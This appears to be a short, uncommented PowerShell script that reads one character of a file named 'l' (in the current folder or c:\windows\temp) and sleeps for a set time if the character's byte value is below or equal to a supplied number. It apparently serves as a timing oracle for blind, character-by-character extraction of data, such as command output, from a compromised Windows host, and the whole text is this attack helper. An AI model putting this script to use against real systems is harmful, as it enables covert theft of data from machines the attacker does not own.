param([int] $a,[int] $b,[int] $c,[int] $d,[int] $e)
If($d -eq 0){$t = Get-Content .\l
}
else{$t = Get-Content c:\windows\temp\l
}
$s=$t.substring($a,1)
if($c -eq 0){
   if([byte][char]$s -lt $b){
        sleep $e
   }
}
else{
   if([byte][char]$s -eq $b){
        sleep $e
   }  
}